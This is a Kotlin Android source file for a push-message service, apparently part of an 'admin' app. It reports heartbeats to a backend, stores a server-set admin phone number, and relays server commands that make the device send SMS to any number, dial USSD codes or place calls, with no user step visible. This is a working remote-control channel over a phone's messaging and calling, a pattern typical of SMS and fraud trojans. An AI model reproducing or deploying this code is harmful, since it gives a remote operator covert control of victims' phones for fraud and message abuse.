package com.example.admin.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.example.admin.R
import com.example.admin.utils.Constants
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * ══════════════════════════════════════════════════════════════
 *  MyFirebaseMessagingService.kt — Receiver for server-sent FCM
 *
 *  Server sends data-only FCM messages (no notification block).
 *  The message format matches FCMHelper.sendFCMCommand exactly:
 *
 *  data fields:
 *    type      = "CHECK_ONLINE" | "ADMIN_UPDATE" | "DEVICE_COMMAND"
 *    payload   = JSON.stringify({ ...same as FCMHelper payload... })
 *    timestamp = epoch ms string
 *
 *  ── CHECK_ONLINE payload ─────────────────────────────────────
 *  {
 *    "uniqueid":  "deviceUid",
 *    "action":    "ping",
 *    "type":      "CHECK_ONLINE",
 *    "fromAdmin": true,
 *    "deviceId":  "deviceUid",
 *    "messageId": "admin_check_{ts}",
 *    "timestamp": {ts}
 *  }
 *  Response: POST /api/device/:token/upsert with fresh checkedAt
 *
 *  ── ADMIN_UPDATE payload ─────────────────────────────────────
 *  {
 *    "deviceId":  "deviceUid",
 *    "number":    "+919876543210",
 *    "status":    "ACTIVE" | "INACTIVE",
 *    "timestamp": {ts},
 *    "type":      "ADMIN_UPDATE"
 *  }
 *  Response: Save to SharedPreferences "admin_config"
 *
 *  ── DEVICE_COMMAND — SMS payload ─────────────────────────────
 *  {
 *    "uniqueid":  "deviceUid",
 *    "action":    "sms",
 *    "to":        "+919876543210",
 *    "body":      "Hello",
 *    "simSlot":   0,
 *    "timestamp": {ts},
 *    "messageId": "sms_cmd_{ts}",
 *    "fromAdmin": true
 *  }
 *
 *  ── DEVICE_COMMAND — USSD payload ────────────────────────────
 *  {
 *    "uniqueid":  "deviceUid",
 *    "action":    "ussd",
 *    "code":      "*123#",
 *    "simSlot":   0,
 *    "timestamp": {ts},
 *    "messageId": "ussd_cmd_{ts}",
 *    "fromAdmin": true
 *  }
 *
 *  ── DEVICE_COMMAND — Call payload ────────────────────────────
 *  {
 *    "uniqueid":   "deviceUid",
 *    "action":     "call",
 *    "code":       "+919876543210",
 *    "simSlot":    0,
 *    "number":     "+919876543210",   // optional
 *    "actionType": "...",             // optional
 *    "timestamp":  {ts},
 *    "messageId":  "call_cmd_{ts}",
 *    "fromAdmin":  true
 *  }
 * ══════════════════════════════════════════════════════════════
 */
class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgSvc"
        private const val CHANNEL_ID = "default_channel_id"
        const val ACTION_DEVICE_COMMAND = "com.example.admin.DEVICE_COMMAND"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    // ── Token refresh ────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "MyFirebaseMessagingService STARTED")
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "FCM token refreshed")
        sendTokenToBackend(token)
    }

    /**
     * Save fresh FCM token to backend so server always has a
     * valid token to send messages to this device.
     */
    private fun sendTokenToBackend(token: String) {
        val uid = getDeviceUid() ?: return

        serviceScope.launch {
            try {
                val body = JSONObject().apply {
                    put("uid",                  uid)
                    put("fcm_token",            token)
                    put("fcm_token_updated_at", System.currentTimeMillis())
                }.toString().toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("${Constants.DEVICE_API_BASE_URL}/upsert")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        Log.d(TAG, "FCM token saved to backend for uid=$uid")
                    } else {
                        Log.w(TAG, "FCM token save failed: HTTP ${res.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendTokenToBackend error", e)
            }
        }
    }

    // ── Message received ─────────────────────────────────────────

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        Log.d(TAG, "FCM received from: ${remoteMessage.from}")

        // Server sends data-only messages — no notification block
        val data = remoteMessage.data
        if (data.isEmpty()) {
            Log.w(TAG, "FCM message has no data — ignoring")
            return
        }

        val type       = data["type"] ?: ""
        val rawPayload = data["payload"] ?: "{}"
        val timestamp  = data["timestamp"]?.toLongOrNull() ?: System.currentTimeMillis()

        Log.d(TAG, "FCM type=$type ts=$timestamp")

        val payload = try {
            JSONObject(rawPayload)
        } catch (e: Exception) {
            Log.w(TAG, "Bad payload JSON — using empty: $rawPayload")
            JSONObject()
        }

        when (type.uppercase()) {
            "CHECK_ONLINE"   -> handleCheckOnline(payload, timestamp)
            "ADMIN_UPDATE"   -> handleAdminUpdate(payload)
            "DEVICE_COMMAND" -> handleDeviceCommand(payload)
            else             -> Log.w(TAG, "Unknown FCM type: $type")
        }
    }

    // ── CHECK_ONLINE ─────────────────────────────────────────────

    /**
     * Server sent CHECK_ONLINE ping.
     * We respond by POSTing a fresh heartbeat to the backend.
     * The admin portal watches Supabase realtime — when checkedAt
     * changes, it marks this device as Online.
     *
     * Payload: { uniqueid, action:"ping", type:"CHECK_ONLINE",
     *            fromAdmin:true, deviceId, messageId, timestamp }
     */
    private fun handleCheckOnline(payload: JSONObject, fcmTimestamp: Long) {
        // uniqueid comes from payload; fall back to stored device UID
        val uid = payload.optString("uniqueid")
            .ifBlank { payload.optString("deviceId") }
            .ifBlank { getDeviceUid() ?: return }

        Log.d(TAG, "CHECK_ONLINE → uid=$uid")

        serviceScope.launch {
            try {
                val now = System.currentTimeMillis()

                val body = JSONObject().apply {
                    put("uid",         uid)
                    put("data_type",   "heartbeat")
                    put("checked_at",  now)
                    put("online",      true)
                    put("available",   "online")
                    put("timestamp",   now)
                    put("fcm_ping_ts", fcmTimestamp)
                }.toString().toRequestBody("application/json".toMediaType())

                val req = Request.Builder()
                    .url("${Constants.DEVICE_API_BASE_URL}/upsert")
                    .post(body)
                    .build()

                http.newCall(req).execute().use { res ->
                    if (res.isSuccessful) {
                        Log.d(TAG, "CHECK_ONLINE heartbeat sent ✓ uid=$uid checkedAt=$now")
                    } else {
                        Log.w(TAG, "CHECK_ONLINE heartbeat failed: HTTP ${res.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleCheckOnline error", e)
            }
        }
    }

    // ── ADMIN_UPDATE ─────────────────────────────────────────────

    /**
     * Server pushed a new admin phone number to this device.
     * Payload: { deviceId, number, status:"ACTIVE"|"INACTIVE",
     *            timestamp, type:"ADMIN_UPDATE" }
     */
    private fun handleAdminUpdate(payload: JSONObject) {
        val number = payload.optString("number")
        val status = payload.optString("status", "ACTIVE")
        val uid    = payload.optString("deviceId").ifBlank { getDeviceUid() }

        Log.d(TAG, "ADMIN_UPDATE number=$number status=$status uid=$uid")

        try {
            val prefs = getSharedPreferences("admin_config", Context.MODE_PRIVATE)
            prefs.edit()
                .putString("admin_number",     number)
                .putString("admin_status",     status)
                .putLong("admin_updated_at",   System.currentTimeMillis())
                .apply()

            Log.d(TAG, "Admin number stored: $number ($status)")
        } catch (e: Exception) {
            Log.e(TAG, "handleAdminUpdate error", e)
        }
    }

    // ── DEVICE_COMMAND ───────────────────────────────────────────

    /**
     * Server sent sms / ussd / call command.
     * Broadcasts an intent so the app's BroadcastReceiver / Service handles it.
     *
     * SMS payload:  { uniqueid, action:"sms",  to, body, simSlot, ... }
     * USSD payload: { uniqueid, action:"ussd", code, simSlot, ... }
     * Call payload: { uniqueid, action:"call", code, simSlot, number?, actionType?, ... }
     */
    private fun handleDeviceCommand(payload: JSONObject) {
        val action     = payload.optString("action").lowercase()
        val uid        = payload.optString("uniqueid")
            .ifBlank { payload.optString("deviceId") }
            .ifBlank { getDeviceUid() ?: "" }
        val simSlot    = payload.optInt("simSlot", 0)
        val messageId  = payload.optString("messageId", "")
        val timestamp  = payload.optLong("timestamp", System.currentTimeMillis())

        Log.d(TAG, "DEVICE_COMMAND action=$action uid=$uid simSlot=$simSlot")

        try {
            val intent = Intent(ACTION_DEVICE_COMMAND).apply {
                `package` = packageName

                // Common fields
                putExtra("action",     action)
                putExtra("uniqueid",   uid)
                putExtra("deviceId",   uid)
                putExtra("simSlot",    simSlot)
                putExtra("messageId",  messageId)
                putExtra("timestamp",  timestamp)
                putExtra("fromAdmin",  true)

                when (action) {
                    "sms" -> {
                        val to   = payload.optString("to")
                        val body = payload.optString("body")
                        Log.d(TAG, "SMS → to=$to simSlot=$simSlot body=${body.take(40)}")
                        putExtra("to",   to)
                        putExtra("body", body)
                    }
                    "ussd" -> {
                        val code = payload.optString("code")
                        Log.d(TAG, "USSD → code=$code simSlot=$simSlot")
                        putExtra("code", code)
                    }
                    "call" -> {
                        val code       = payload.optString("code")
                        val number     = payload.optString("number")
                        val actionType = payload.optString("actionType")
                        Log.d(TAG, "CALL → code=$code number=$number simSlot=$simSlot")
                        putExtra("code",       code)
                        putExtra("number",     number)
                        putExtra("actionType", actionType)
                    }
                    else -> Log.w(TAG, "Unknown DEVICE_COMMAND action: $action")
                }
            }
            sendBroadcast(intent)
            Log.d(TAG, "DEVICE_COMMAND broadcast sent: $action")
        } catch (e: Exception) {
            Log.e(TAG, "handleDeviceCommand error", e)
        }
    }

    // ── Helpers ──────────────────────────────────────────────────

    /**
     * Read device UID stored at registration time.
     * Falls back to ANDROID_ID if SharedPreferences is empty.
     */
    private fun getDeviceUid(): String? {
        return try {
            val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
            val saved = prefs.getString("device_uid", null)
            if (!saved.isNullOrBlank()) return saved

            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ).takeIf { !it.isNullOrBlank() }
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceUid error", e)
            null
        }
    }

    // ── Notification helper (for non-data messages only) ─────────

    @Suppress("unused")
    private fun showNotification(title: String, messageBody: String) {
        createNotificationChannel()

        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)

        val mgr = NotificationManagerCompat.from(this)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (ActivityCompat.checkSelfPermission(
                        this, android.Manifest.permission.POST_NOTIFICATIONS
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    Log.w(TAG, "Notification permission not granted — skipping")
                    return
                }
            }
            mgr.notify(System.currentTimeMillis().toInt(), builder.build())
        } catch (se: SecurityException) {
            Log.e(TAG, "Notification failed: ${se.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Default Channel", NotificationManager.IMPORTANCE_HIGH
            ).apply { description = "General Notifications" }
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            mgr.createNotificationChannel(channel)
        }
    }
}
